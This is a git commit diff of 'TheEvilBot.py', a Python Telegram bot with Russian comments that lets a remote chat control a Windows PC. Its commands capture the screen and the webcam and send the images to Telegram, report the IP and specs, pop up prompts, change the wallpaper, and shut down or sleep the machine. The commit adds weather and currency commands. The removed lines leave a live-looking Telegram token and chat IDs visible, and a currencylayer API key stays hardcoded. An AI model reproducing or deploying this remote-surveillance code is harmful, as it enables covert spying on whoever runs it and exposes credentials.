12bc6cbd036d03c381c3888b1f6832c0f90d2953
X1ag <83949999+X1ag@users.noreply.github.com>
2022-06-26 12:18:23 +0300

    Update TheEvilBot.py

--- TheEvilBot.py
+++ TheEvilBot.py
@@ -1,4 +1,5 @@
 import requests
+import datetime
 import cv2
 import ctypes
 import time
@@ -9,22 +10,26 @@ import telebot
 from telebot import types
 import webbrowser
 
-token = '5386789204:AAG3pJ7T3dWrn-SsqOWIbPFOtZwLbp7_7-o'
-chat_id1 = '744246158'
-chat_id = '1455902697'
+token = 'here telegrambot token'
+chat_id1 = 'user chat id'
 bot = telebot.TeleBot(token)
+open_weather_token = 'here open_weather_token'
 
 requests.post(
-    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=Выбери команду: /ip, /spec, /screenshot, /webcam, /message, /input, /wallpaper, /off, /restart, /sleep, /request")
+    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=Выбери команду: /ip, /spec, /screenshot,"
+    f" /webcam, /message, /input, /wallpaper, /off, /restart, /sleep, /request, /website, /USD, /weather")
+    # Когда бот включен он пишет такое сообщение пользователю
 
-
+# Функция при команде /start
 @bot.message_handler(commands=['start'])
 def start(message):
     rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
     btns = ['/ip', '/spec', '/screenshot', '/webcam',
-            '/message', '/input', '/off', '/restart', '/sleep', '/request']
+            '/message', '/input', '/wallpaper', '/off',
+            '/restart', '/sleep', '/request', '/website',
+            '/USD', '/weather'] # Список с кнопками кнопки
 
-    for btn in btns:
+    for btn in btns: # Дабы не писать миллион строк кода проходимся циклом по массиву и добавляем каждую кнопку в список кнопок
         rmk.add(types.KeyboardButton(btn))
 
     bot.send_message(message.chat.id, 'Выберите команду', reply_markup=rmk)
@@ -32,7 +37,7 @@ def start(message):
 
 @bot.message_handler(commands=['ip', 'ip_address'])
 def ip_address(message):
-    response = requests.get('http://jsonip.com/').json()
+    response = requests.get('http://jsonip.com/').json() # Делаем запрос на сайт который показывает ip и парсив json формат
     bot.send_message(message.chat.id, f'Your ip address: {response["ip"]}')
 
 
@@ -44,25 +49,28 @@ def spec(message):
 
 @bot.message_handler(commands=['screenshot'])
 def screenshot(message):
-    pag.screenshot('000.jpg')
+    #Делаем скриншот и сохраняем в определенную директорию, дабы не засорять нынешнюю.
+    pag.screenshot(r'C:\Users\x1ag\Desktop\forbot\000.jpg')
 
-    with open('000.jpg', 'rb') as img:
+    with open(r'C:\Users\x1ag\Desktop\forbot\000.jpg', 'rb') as img:
         bot.send_photo(message.chat.id, img)
+
+
 
 
 @bot.message_handler(commands=['webcam'])
 def webcam(message):
     cap = cv2.VideoCapture(0)
-
+    # Прогреваем камеру
     for i in range(30):
         cap.read()
 
     ret, frame = cap.read()
 
-    cv2.imwrite('cam.jpg', frame)
+    cv2.imwrite(r'C:\Users\x1ag\Desktop\forbot\cam.jpg', frame)
     cap.release()
 
-    with open('cam.jpg', 'rb') as img:
+    with open(r'C:\Users\x1ag\Desktop\forbot\cam.jpg', 'rb') as img:
         bot.send_photo(message.chat.id, img)
 
 
@@ -75,7 +83,8 @@ def message_sending(message):
 def next_message_sending(message):
     try:
         pag.alert(message.text, '^')
-    except Exception:
+    except Exception as ex:
+        print(ex)
         bot.send_message(message.chat.id, 'Что-то пошло не так')
 
 
@@ -87,9 +96,12 @@ def message_sending_with_input(message):
 
 def next_message_sending_with_input(message):
     try:
+        #Чтобы бот не слетел делаем проверку try except
         answer = pag.prompt(message.text, '^')
+        # Бот вызывает на компьютере команду которая подразумевает под собой ответ, собственно этот ответ мы и выводим
         bot.send_message(message.chat.id, answer)
-    except Exception:
+    except Exception as ex:
+        print(ex)
         bot.send_message(message.chat.id, 'Что-то пошло не так')
 
 
@@ -106,12 +118,13 @@ def next_wallpaper(message):
         file = bot.get_file(file)
         dfile = bot.download_file(file.file_path)
 
-        with open('image.jpg', 'wb') as img:
+        with open(r'C:\Users\x1ag\Desktop\forbot\image.jpg', 'wb') as img:
             img.write(dfile)
 
-        path = os.path.abspath('image.jpg')
+        path = os.path.abspath(r'C:\Users\x1ag\Desktop\forbot\image.jpg')
         ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-    except Exception:
+    except Exception as ex:
+        print(ex)
         bot.send_message(message.chat.id, 'Видимо, это не картинка')
 
 
@@ -162,14 +175,93 @@ def get_request(message):
     bot.register_next_step_handler(msg, next_request)
 
 
-@bot.message_handler(content_types=['text'])
 def next_request(message):
     webbrowser.open_new_tab('https://www.google.com/search?q={}'.format(f'{message.text}'))
-    countdown(5)
-    pag.screenshot('000.jpg')
+    #Делаем гугл запрос с помощью библиотеки
+    countdown(5) # Ставим задержку перед отправкой чтобы страница успела прогрузиться
+    pag.screenshot(r'C:\Users\x1ag\Desktop\forbot\000.jpg')
 
-    with open('000.jpg', 'rb') as img:
+    with open(r'C:\Users\x1ag\Desktop\forbot\000.jpg', 'rb') as img:
         bot.send_photo(message.chat.id, img)
+
+
+@bot.message_handler(commands=['website'])
+def get_website(message):
+    bot.send_message(message.chat.id, 'Сейчас кину ссылочку :)')
+    bot.send_message(message.chat.id, 'https://x1ag.github.io/mywebsite1/')
+
+
+@bot.message_handler(commands=['USD', 'usd'])
+def get_data(message):
+    req = requests.get('http://api.currencylayer.com/live?access_key=7fe2ed73dbae3284b2086b88a6a3d992')
+    # Делаем API запрос на цену на все валюты
+    response = req.json()
+    sell_price = response['quotes']['USDRUB'] # Достаем оттуда цену
+    sell_price = int(sell_price * 100) / 100 # Округляем до двух чисел после запятой
+    bot.send_message(message.chat.id,
+                     f'Сейчас {datetime.datetime.now().strftime("%d-%m-%y, %H:%M")}\nДоллар стоит: {sell_price}')
+
+
+@bot.message_handler(commands=['weather'])
+def get_weather(message):
+    bot.send_message(message.chat.id, "Пришлите название города")
+
+
+@bot.message_handler(content_types=['text'])
+def show_weather(message: types.Message):
+    city = message.text
+    code_to_smile = {
+        'Clear': "Ясно \U00002600",
+        'Clouds': 'Облачно \U00002601',
+        'Rain': 'Дождь \U00002614',
+        'Drizzle': "Дождь \U00002614",
+        'Thunderstorm': 'Гроза \U000026A1',
+        'Snow': 'Снег \U0001F328',
+        'Mist': 'Туман \U0001F32B',
+        # Смайлики
+    }
+    try:
+        r = requests.get(
+            f'http://api.openweathermap.org/geo/1.0/direct?q={city}&appid={open_weather_token}&units=metric'
+        )
+        data = r.json()
+        lat = data[0]['lat']
+        lon = data[0]['lon']
+        city = data[0]['name']
+        # Получаем координаты города и его название
+
+        g = requests.get(
+            f'https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={open_weather_token}'
+            f'&units=metric')
+        weather = g.json()
+        # Делаем гет запрос чтобы получить файл со всеми погодными условиями в этом районе
+
+        cur_weather = weather['main']['temp']
+
+        weather_description = weather['weather'][0]['main']
+        if weather_description in code_to_smile:
+            wd = code_to_smile[weather_description]
+        else:
+            wd = 'Посмотри в окно, я не понимаю что там за погода!'
+
+        humidity = weather['main']['humidity']
+        pressure = weather['main']['pressure']
+        wind_speed = weather['wind']['speed']
+        sunrise_timestamp = datetime.datetime.fromtimestamp(weather['sys']['sunrise'])
+        sunset_timestamp = datetime.datetime.fromtimestamp(weather['sys']['sunset'])
+        length_of_the_day = sunset_timestamp - sunrise_timestamp
+
+        bot.send_message(message.chat.id, f'***{datetime.datetime.now().strftime("%d-%m-%y, %H:%M")}***\n'
+                                          f'Погода в городе: {city}\nТемпература: {cur_weather}C° {wd}\n'
+                                          f'Влажность: {humidity}%\nДавление: {pressure} мм.рт.ст\nВетер: {wind_speed}'
+                                          f'м/c\n'
+                                          f'Восход солнца: {sunrise_timestamp}\nЗакат солнца: {sunset_timestamp}\n'
+                                          f'Продолжительность дня: {length_of_the_day}\n'
+                                          f'***Хорошего дня!***')
+
+    except Exception as ex:
+        print(ex)
+        bot.send_message(message.chat.id, 'Проверьте название города/штата')
 
 
 def countdown(num_of_secs):
@@ -179,5 +271,7 @@ def countdown(num_of_secs):
         print(min_sec_format, end='/r')
         time.sleep(1)
         num_of_secs -= 1
+    # Счетчик секунд(для запроса в гугл)
+
 
 bot.polling()
